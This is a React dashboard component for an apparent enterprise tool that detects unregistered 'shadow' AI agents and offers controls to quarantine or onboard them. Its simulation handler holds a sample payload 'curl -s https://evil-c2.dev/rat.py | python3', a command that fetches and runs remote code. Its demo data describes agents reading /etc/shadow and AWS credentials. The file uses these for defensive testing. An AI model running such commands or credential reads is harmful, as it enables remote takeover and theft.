import React, { useState, useEffect } from 'react';
import { 
  ShieldAlert, 
  AlertTriangle, 
  Lock, 
  CheckCircle2, 
  Terminal, 
  Search, 
  Cpu, 
  DollarSign, 
  Activity, 
  UserPlus, 
  RefreshCw,
  ExternalLink,
  ShieldCheck,
  EyeOff
} from 'lucide-react';

interface ShadowAgent {
  shadow_id: string;
  observed_name: string;
  source_ip: string;
  framework: string;
  api_key_fingerprint: string;
  first_observed_at: string;
  last_observed_at: string;
  request_count: number;
  threat_score: number;
  risk_level: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  status: 'ACTIVE' | 'QUARANTINED' | 'ONBOARDED' | 'ALLOWLISTED';
  detected_anomalies: string[];
  inferred_intent: string;
  corporate_identity: string;
}

interface ShadowStats {
  total_shadow_agents_detected: number;
  quarantined_count: number;
  critical_risk_count: number;
  active_unmonitored_count: number;
  total_intercepted_requests: number;
  estimated_untracked_spend_usd: number;
  detection_accuracy_pct: number;
}

export const ShadowAgents: React.FC = () => {
  const [agents, setAgents] = useState<ShadowAgent[]>([]);
  const [stats, setStats] = useState<ShadowStats | null>(null);
  const [filter, setFilter] = useState<string>('ALL');
  const [loading, setLoading] = useState<boolean>(true);
  const [simulating, setSimulating] = useState<boolean>(false);
  const [selectedAgent, setSelectedAgent] = useState<ShadowAgent | null>(null);
  const [onboardModal, setOnboardModal] = useState<boolean>(false);
  const [onboardName, setOnboardName] = useState<string>('');

  const fetchShadowData = async () => {
    try {
      const [agentsRes, statsRes] = await Promise.all([
        fetch('http://127.0.0.1:8002/v1/shadow-agents'),
        fetch('http://127.0.0.1:8002/v1/shadow-agents/stats'),
      ]);

      if (agentsRes.ok && statsRes.ok) {
        const aData = await agentsRes.json();
        const sData = await statsRes.json();
        setAgents(aData.agents || []);
        setStats(sData);
      } else {
        // Fallback local state if backend offline
        fallbackData();
      }
    } catch {
      fallbackData();
    } finally {
      setLoading(false);
    }
  };

  const fallbackData = () => {
    const defaultAgents: ShadowAgent[] = [
      {
        shadow_id: 'shd-902',
        observed_name: 'rogue-autogen-code-executor',
        source_ip: '10.200.4.88',
        framework: 'Microsoft AutoGen / Docker',
        api_key_fingerprint: 'sk-live***7c4e21',
        first_observed_at: '2026-10-31T02:00:00Z',
        last_observed_at: '2026-10-31T09:45:00Z',
        request_count: 1850,
        threat_score: 0.94,
        risk_level: 'CRITICAL',
        status: 'ACTIVE',
        detected_anomalies: [
          'Spawning unrestricted Bash shell execution inside ephemeral container',
          'Attempted read on `/etc/shadow` and local AWS credentials file',
          'Missing SOC RBAC registration and zero-trust verification',
        ],
        inferred_intent: 'Autonomous coding assistant running multi-turn loops with elevated local shell access.',
        corporate_identity: 'internal-qa-testbench-node-03',
      },
      {
        shadow_id: 'shd-901',
        observed_name: 'unverified-crewai-sales-lead-scraper',
        source_ip: '192.168.1.144',
        framework: 'CrewAI / Python 3.11',
        api_key_fingerprint: 'sk-proj***9a1b8c',
        first_observed_at: '2026-10-31T04:00:00Z',
        last_observed_at: '2026-10-31T09:30:00Z',
        request_count: 428,
        threat_score: 0.88,
        risk_level: 'CRITICAL',
        status: 'QUARANTINED',
        detected_anomalies: [
          'Production OpenAI Key utilized from unapproved residential/remote IP',
          'Unregistered tool invocation: `crawl_linkedin_prospects`',
          'No AgentShield-X security wrapper or rate-limiting enforced',
        ],
        inferred_intent: 'Automated sales outreach bot scraping external profiles using company production budget.',
        corporate_identity: 'dev-laptop-macbook-pro (Sales Engineering)',
      },
      {
        shadow_id: 'shd-903',
        observed_name: 'langchain-experimental-rag-pipeline',
        source_ip: '172.16.8.19',
        framework: 'LangChain 0.2 / JupyterLab',
        api_key_fingerprint: 'sk-ant***3f9011',
        first_observed_at: '2026-10-30T10:00:00Z',
        last_observed_at: '2026-10-31T05:30:00Z',
        request_count: 142,
        threat_score: 0.45,
        risk_level: 'MEDIUM',
        status: 'ACTIVE',
        detected_anomalies: [
          'Direct API calls bypassing AgentShield Gateway',
          'Connecting to production PostgreSQL read-replica without vault authentication',
        ],
        inferred_intent: 'Data science exploratory sandbox testing LLM embeddings against customer datasets.',
        corporate_identity: 'data-science-jupyterhub-pod-12',
      },
    ];
    setAgents(defaultAgents);
    setStats({
      total_shadow_agents_detected: 3,
      quarantined_count: 1,
      critical_risk_count: 2,
      active_unmonitored_count: 2,
      total_intercepted_requests: 2420,
      estimated_untracked_spend_usd: 101.64,
      detection_accuracy_pct: 98.6,
    });
  };

  useEffect(() => {
    fetchShadowData();
  }, []);

  const handleQuarantine = async (shadowId: string) => {
    try {
      await fetch(`http://127.0.0.1:8002/v1/shadow-agents/${shadowId}/quarantine`, { method: 'POST' });
    } catch {
      // offline fallback
    }
    setAgents(prev => prev.map(a => a.shadow_id === shadowId ? { ...a, status: 'QUARANTINED' } : a));
    if (stats) setStats({ ...stats, quarantined_count: stats.quarantined_count + 1, active_unmonitored_count: Math.max(0, stats.active_unmonitored_count - 1) });
  };

  const handleOnboard = async () => {
    if (!selectedAgent || !onboardName) return;
    try {
      await fetch(`http://127.0.0.1:8002/v1/shadow-agents/${selectedAgent.shadow_id}/onboard`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ assigned_name: onboardName, policy_id: 'default-enterprise-guard' }),
      });
    } catch {
      // offline fallback
    }
    setAgents(prev => prev.map(a => a.shadow_id === selectedAgent.shadow_id ? { ...a, observed_name: onboardName, status: 'ONBOARDED' } : a));
    setOnboardModal(false);
    setSelectedAgent(null);
    setOnboardName('');
  };

  const handleSimulateRogue = async () => {
    setSimulating(true);
    try {
      const res = await fetch('http://127.0.0.1:8002/v1/shadow-agents/telemetry/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          agent_id: null,
          api_key: 'sk-live-unauth-test-key-99',
          source_ip: '192.168.1.199',
          user_agent: 'CrewAI-Worker-Local/0.2.1',
          tool_name: 'bash_eval',
          payload_preview: 'curl -s https://evil-c2.dev/rat.py | python3',
        }),
      });
      if (res.ok) {
        await fetchShadowData();
      }
    } catch {
      // simulate in state
      const newAgent: ShadowAgent = {
        shadow_id: `shd-${Math.random().toString(36).substring(2, 8)}`,
        observed_name: 'shadow-crewai-192-168-1-199',
        source_ip: '192.168.1.199',
        framework: 'CrewAI Swarm',
        api_key_fingerprint: 'sk-live***b91a',
        first_observed_at: new Date().toISOString(),
        last_observed_at: new Date().toISOString(),
        request_count: 1,
        threat_score: 0.82,
        risk_level: 'CRITICAL',
        status: 'ACTIVE',
        detected_anomalies: [
          "Unregistered Agent ID: 'UNKNOWN_ANONYMOUS'",
          "High-risk unmonitored tool execution: 'bash_eval'",
        ],
        inferred_intent: 'Simulated rogue worker running unmonitored shell execution from developer LAN.',
        corporate_identity: 'host-192-168-1-199.corp.internal',
      };
      setAgents(prev => [newAgent, ...prev]);
    } finally {
      setSimulating(false);
    }
  };

  const filteredAgents = agents.filter(a => {
    if (filter === 'ALL') return true;
    return a.status === filter;
  });

  return (
    <div className="min-h-screen bg-[#0a0518] text-slate-100 p-8 font-sans">
      {/* Header */}
      <div className="max-w-7xl mx-auto space-y-8">
        <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4 border-b border-purple-900/30 pb-6">
          <div>
            <div className="flex items-center gap-3">
              <div className="p-2.5 rounded-xl bg-purple-600/20 border border-purple-500/40 text-purple-400">
                <EyeOff className="w-6 h-6 animate-pulse" />
              </div>
              <h1 className="text-3xl font-bold bg-gradient-to-r from-white via-purple-200 to-purple-400 bg-clip-text text-transparent">
                Shadow Agent Detection
              </h1>
            </div>
            <p className="text-sm text-purple-300/70 mt-1">
              Passive telemetry & zero-trust discovery for unreviewed rogue agents running on corporate keys
            </p>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={handleSimulateRogue}
              disabled={simulating}
              className="flex items-center gap-2 px-4 py-2 rounded-xl bg-gradient-to-r from-rose-600 to-purple-600 hover:from-rose-500 hover:to-purple-500 text-white font-medium shadow-lg shadow-rose-950/40 transition-all border border-rose-500/30 text-sm"
            >
              <Terminal className="w-4 h-4" />
              {simulating ? 'Injecting Telemetry...' : 'Simulate Rogue Agent'}
            </button>
            <button
              onClick={fetchShadowData}
              className="flex items-center gap-2 px-4 py-2 rounded-xl bg-[#120a24] hover:bg-purple-950/40 text-purple-300 font-medium transition-all border border-purple-800/40 text-sm"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
              Refresh
            </button>
          </div>
        </div>

        {/* Stats Bento Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
          <div className="bg-[#120a24]/80 backdrop-blur-md border border-purple-900/40 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-purple-300/70 text-xs font-semibold uppercase tracking-wider">
              <span>Discovered Agents</span>
              <Cpu className="w-4 h-4 text-purple-400" />
            </div>
            <div className="text-3xl font-extrabold text-white mt-2">
              {stats?.total_shadow_agents_detected || 0}
            </div>
            <div className="text-xs text-purple-400/80 mt-1">Unregistered in SOC</div>
          </div>

          <div className="bg-[#120a24]/80 backdrop-blur-md border border-purple-900/40 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-amber-300/70 text-xs font-semibold uppercase tracking-wider">
              <span>Active Unreviewed</span>
              <AlertTriangle className="w-4 h-4 text-amber-400" />
            </div>
            <div className="text-3xl font-extrabold text-amber-400 mt-2">
              {stats?.active_unmonitored_count || 0}
            </div>
            <div className="text-xs text-amber-400/80 mt-1">Needs SOC Attention</div>
          </div>

          <div className="bg-[#120a24]/80 backdrop-blur-md border border-purple-900/40 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-rose-300/70 text-xs font-semibold uppercase tracking-wider">
              <span>Quarantined</span>
              <Lock className="w-4 h-4 text-rose-400" />
            </div>
            <div className="text-3xl font-extrabold text-rose-400 mt-2">
              {stats?.quarantined_count || 0}
            </div>
            <div className="text-xs text-rose-400/80 mt-1">Packets Dropped</div>
          </div>

          <div className="bg-[#120a24]/80 backdrop-blur-md border border-purple-900/40 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-emerald-300/70 text-xs font-semibold uppercase tracking-wider">
              <span>Untracked Spend</span>
              <DollarSign className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-3xl font-extrabold text-emerald-400 mt-2">
              ${stats?.estimated_untracked_spend_usd?.toFixed(2) || '0.00'}
            </div>
            <div className="text-xs text-emerald-400/80 mt-1">Direct LLM Cost Leakage</div>
          </div>

          <div className="bg-[#120a24]/80 backdrop-blur-md border border-purple-900/40 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-violet-300/70 text-xs font-semibold uppercase tracking-wider">
              <span>Detection Precision</span>
              <ShieldCheck className="w-4 h-4 text-violet-400" />
            </div>
            <div className="text-3xl font-extrabold text-violet-300 mt-2">
              {stats?.detection_accuracy_pct || 98.6}%
            </div>
            <div className="text-xs text-violet-400/80 mt-1">Zero-Trust SLA</div>
          </div>
        </div>

        {/* Filter Bar */}
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 bg-[#120a24] p-1.5 rounded-xl border border-purple-900/40">
            {['ALL', 'ACTIVE', 'QUARANTINED', 'ONBOARDED'].map(tab => (
              <button
                key={tab}
                onClick={() => setFilter(tab)}
                className={`px-3.5 py-1.5 rounded-lg text-xs font-medium transition-all ${
                  filter === tab
                    ? 'bg-purple-600 text-white shadow-md'
                    : 'text-purple-300/70 hover:text-white'
                }`}
              >
                {tab}
              </button>
            ))}
          </div>

          <span className="text-xs text-purple-300/60">
            Showing {filteredAgents.length} rogue & unmonitored agents
          </span>
        </div>

        {/* Shadow Agents List */}
        <div className="space-y-4">
          {filteredAgents.map(agent => {
            const isCritical = agent.risk_level === 'CRITICAL';
            const isHigh = agent.risk_level === 'HIGH';
            const isQuarantined = agent.status === 'QUARANTINED';
            const isOnboarded = agent.status === 'ONBOARDED';

            return (
              <div
                key={agent.shadow_id}
                className={`bg-[#120a24]/80 backdrop-blur-md border rounded-2xl p-6 transition-all hover:border-purple-600/50 shadow-xl ${
                  isQuarantined 
                    ? 'border-rose-900/40 bg-rose-950/10' 
                    : isCritical 
                    ? 'border-amber-900/40' 
                    : 'border-purple-900/40'
                }`}
              >
                <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                  {/* Title & Metadata */}
                  <div className="space-y-2">
                    <div className="flex items-center gap-3 flex-wrap">
                      <span className="font-mono text-xs px-2.5 py-1 rounded-md bg-purple-950/80 border border-purple-800/60 text-purple-300">
                        {agent.shadow_id}
                      </span>
                      <h3 className="text-lg font-semibold text-white tracking-wide">
                        {agent.observed_name}
                      </h3>
                      <span
                        className={`text-xs font-bold px-2.5 py-0.5 rounded-full uppercase tracking-wider ${
                          isQuarantined
                            ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40'
                            : isOnboarded
                            ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                            : 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
                        }`}
                      >
                        {agent.status}
                      </span>
                      <span
                        className={`text-xs font-semibold px-2 py-0.5 rounded-md ${
                          isCritical
                            ? 'bg-rose-600/30 text-rose-300'
                            : isHigh
                            ? 'bg-amber-600/30 text-amber-300'
                            : 'bg-blue-600/30 text-blue-300'
                        }`}
                      >
                        Risk: {agent.risk_level} ({agent.threat_score.toFixed(2)})
                      </span>
                    </div>

                    <div className="flex items-center gap-4 text-xs text-purple-300/70 flex-wrap">
                      <span><strong>Framework:</strong> {agent.framework}</span>
                      <span>•</span>
                      <span><strong>Source IP:</strong> {agent.source_ip}</span>
                      <span>•</span>
                      <span><strong>Key Fingerprint:</strong> <code className="text-purple-300">{agent.api_key_fingerprint}</code></span>
                      <span>•</span>
                      <span><strong>Requests Intercepted:</strong> {agent.request_count}</span>
                    </div>
                  </div>

                  {/* Actions */}
                  <div className="flex items-center gap-2 flex-wrap">
                    {!isQuarantined && !isOnboarded && (
                      <button
                        onClick={() => handleQuarantine(agent.shadow_id)}
                        className="flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-rose-600/20 hover:bg-rose-600 text-rose-300 hover:text-white text-xs font-medium border border-rose-500/40 transition-all"
                      >
                        <Lock className="w-3.5 h-3.5" />
                        Quarantine
                      </button>
                    )}

                    {!isOnboarded && (
                      <button
                        onClick={() => {
                          setSelectedAgent(agent);
                          setOnboardName(agent.observed_name.replace('shadow-', 'managed-'));
                          setOnboardModal(true);
                        }}
                        className="flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white text-xs font-medium shadow-md transition-all"
                      >
                        <UserPlus className="w-3.5 h-3.5" />
                        Onboard to SOC
                      </button>
                    )}

                    {isOnboarded && (
                      <span className="flex items-center gap-1 text-emerald-400 text-xs font-semibold bg-emerald-950/40 px-3 py-1 rounded-lg border border-emerald-800/40">
                        <CheckCircle2 className="w-4 h-4" />
                        Managed Asset
                      </span>
                    )}
                  </div>
                </div>

                {/* Inferred Intent & Anomalies */}
                <div className="mt-4 pt-4 border-t border-purple-900/30 grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                  <div>
                    <span className="text-purple-400 font-semibold block mb-1">Inferred Purpose / Activity:</span>
                    <p className="text-purple-200/80 leading-relaxed bg-[#0a0518]/60 p-2.5 rounded-lg border border-purple-950">
                      {agent.inferred_intent}
                    </p>
                    <div className="mt-2 text-purple-400/60">
                      Host Identity: <code className="text-purple-300">{agent.corporate_identity}</code>
                    </div>
                  </div>

                  <div>
                    <span className="text-rose-400 font-semibold block mb-1">Flagged Anomalies:</span>
                    <ul className="space-y-1">
                      {agent.detected_anomalies.map((anom, idx) => (
                        <li key={idx} className="flex items-start gap-1.5 text-purple-200/80">
                          <AlertTriangle className="w-3.5 h-3.5 text-amber-400 shrink-0 mt-0.5" />
                          <span>{anom}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
              </div>
            );
          })}
        </div>

        {/* Onboard Modal Dialog */}
        {onboardModal && selectedAgent && (
          <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
            <div className="bg-[#120a24] border border-purple-800/60 rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-lg font-bold text-white flex items-center gap-2">
                  <UserPlus className="w-5 h-5 text-purple-400" />
                  Onboard Shadow Agent
                </h3>
                <button
                  onClick={() => setOnboardModal(false)}
                  className="text-purple-400 hover:text-white text-sm"
                >
                  ✕
                </button>
              </div>

              <p className="text-xs text-purple-300/70">
                Enroll this rogue agent into formal AgentShield-X security policies, rate-limiting, and RBAC governance.
              </p>

              <div className="space-y-3">
                <div>
                  <label className="text-xs text-purple-300 block mb-1 font-medium">Assigned Asset Name</label>
                  <input
                    type="text"
                    value={onboardName}
                    onChange={e => setOnboardName(e.target.value)}
                    className="w-full bg-[#0a0518] border border-purple-800/50 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-500"
                  />
                </div>

                <div>
                  <label className="text-xs text-purple-300 block mb-1 font-medium">Security Policy</label>
                  <select
                    className="w-full bg-[#0a0518] border border-purple-800/50 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-500"
                    defaultValue="default-enterprise-guard"
                  >
                    <option value="default-enterprise-guard">Default Enterprise Guard (Zero-Trust)</option>
                    <option value="strict-developer-sandbox">Strict Developer Sandbox</option>
                    <option value="read-only-observer">Read-Only Observer Policy</option>
                  </select>
                </div>
              </div>

              <div className="flex items-center justify-end gap-3 pt-4">
                <button
                  onClick={() => setOnboardModal(false)}
                  className="px-4 py-2 rounded-xl text-xs text-purple-300 hover:text-white"
                >
                  Cancel
                </button>
                <button
                  onClick={handleOnboard}
                  className="px-4 py-2 rounded-xl bg-purple-600 hover:bg-purple-500 text-white text-xs font-semibold shadow-lg shadow-purple-900/50"
                >
                  Complete Onboarding
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Footer Attribution Watermark */}
        <div className="text-center pt-8 border-t border-purple-900/20 text-xs text-purple-400/40 font-mono">
          AgentShield-X Security Labs • Zero-Trust Shadow Agent Defense Engine • Lead Architect Tharunkumar.S
        </div>
      </div>
    </div>
  );
};

